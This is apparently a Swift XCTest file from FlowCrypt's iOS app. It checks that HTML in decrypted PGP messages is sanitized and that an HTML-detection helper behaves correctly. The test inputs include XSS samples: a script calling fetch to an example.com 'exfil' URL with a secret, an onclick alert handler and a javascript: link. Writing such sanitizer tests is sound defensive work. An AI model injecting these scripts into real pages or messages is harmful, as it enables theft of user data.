//
//  HTMLSanitizationTests.swift
//
//  Created by Mart on 30/06/2026
//  Copyright © 2017-present FlowCrypt a. s. All rights reserved.
//

@testable import FlowCrypt
import XCTest

class HTMLSanitizationTests: XCTestCase {
    let core: Core = .shared

    // MARK: - End-to-end: decrypt a PGP-encrypted XSS payload, then verify sanitization

    func testDecryptedXssPayloadIsStrippedAfterFullRoundtrip() async throws {
        let key = TestData.k0
        let attackHtml = """
        <html>
          <body>
            <p>FC_DECRYPTED_PLAINTEXT_JS_POC</p>
            <script>
              fetch('https://example.com/exfil?data=secret')
            </script>
          </body>
        </html>
        """

        let encrypted = try await core.encrypt(
            data: attackHtml.data(),
            pubKeys: [key.public],
            password: nil
        )

        let decrypted = try await core.parseDecryptMsg(
            encrypted: encrypted,
            keys: [key],
            msgPwd: nil,
            isMime: false,
            verificationPubKeys: []
        )

        let sanitized = try await core.sanitizeHtml(html: decrypted.text)

        XCTAssertTrue(
            sanitized.contains("FC_DECRYPTED_PLAINTEXT_JS_POC"),
            "benign content must survive roundtrip"
        )

        XCTAssertFalse(
            sanitized.contains("<script"),
            "script tags must be removed after full decrypt+sanitize pipeline"
        )
        XCTAssertFalse(
            sanitized.contains("fetch("),
            "script body must be removed"
        )
        XCTAssertFalse(
            sanitized.contains("example.com"),
            "example URLs must be removed"
        )
    }

    func testDecryptedHtmlWithoutTagsPassesThrough() async throws {
        let key = TestData.k0
        let plainText = "Hello, this is a normal encrypted message."

        let encrypted = try await core.encrypt(
            data: plainText.data(),
            pubKeys: [key.public],
            password: nil
        )
        let decrypted = try await core.parseDecryptMsg(
            encrypted: encrypted,
            keys: [key],
            msgPwd: nil,
            isMime: false,
            verificationPubKeys: []
        )
        let sanitized = try await core.sanitizeHtml(html: decrypted.text)

        XCTAssertEqual(sanitized, plainText)
    }

    // MARK: - sanitizeHtml unit tests

    func testSanitizeHtmlStripsScriptTags() async throws {
        let input = """
        <html><body><p>Hello</p><script>fetch('https://example.com/exfil')</script></body></html>
        """
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNotNil(sanitized.range(of: "Hello"))
        XCTAssertNil(sanitized.range(of: "<script"))
        XCTAssertNil(sanitized.range(of: "fetch("))
        XCTAssertNil(sanitized.range(of: "example.com"))
    }

    func testSanitizeHtmlStripsInlineEventHandlers() async throws {
        let input = "<p onclick=\"alert(1)\">Click me</p>"
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNotNil(sanitized.range(of: "Click me"))
        XCTAssertNil(sanitized.range(of: "onclick"))
        XCTAssertNil(sanitized.range(of: "alert"))
    }

    func testSanitizeHtmlStripsJavascriptProtocolInLinks() async throws {
        let input = "<a href=\"javascript:alert('xss')\">click</a>"
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNil(sanitized.range(of: "javascript:"))
    }

    func testSanitizeHtmlPreservesSafePlainText() async throws {
        let input = "This is a plain text message with no HTML."
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertEqual(sanitized, input)
    }

    func testSanitizeHtmlPreservesSafeFormatting() async throws {
        let input = "<b>bold</b> and <i>italic</i>"
        let sanitized = try await core.sanitizeHtml(html: input)
        XCTAssertNotNil(sanitized.range(of: "bold"))
        XCTAssertNotNil(sanitized.range(of: "italic"))
    }

    // MARK: - isHTMLString (decrypted-content routing detection)

    func testIsHtmlStringDetectsMatchingTags() {
        let input = "<div>Hello</div>"
        XCTAssertTrue(input.isHTMLString)
    }

    func testIsHtmlStringDetectsNestedHtml() {
        let input = "<html><body><p>content</p></body></html>"
        XCTAssertTrue(input.isHTMLString)
    }

    func testIsHtmlStringNegativeForPlainText() {
        let input = "Hello, this is a plain message."
        XCTAssertFalse(input.isHTMLString)
    }

    func testIsHtmlStringNegativeForEmailAngleBrackets() {
        let input = "Please contact us at <user@example.com> for support."
        XCTAssertFalse(input.isHTMLString)
    }

    func testIsHtmlStringNegativeForUnmatchedOpeningTag() {
        let input = "Just an opening <div without closing."
        XCTAssertFalse(input.isHTMLString)
    }
}
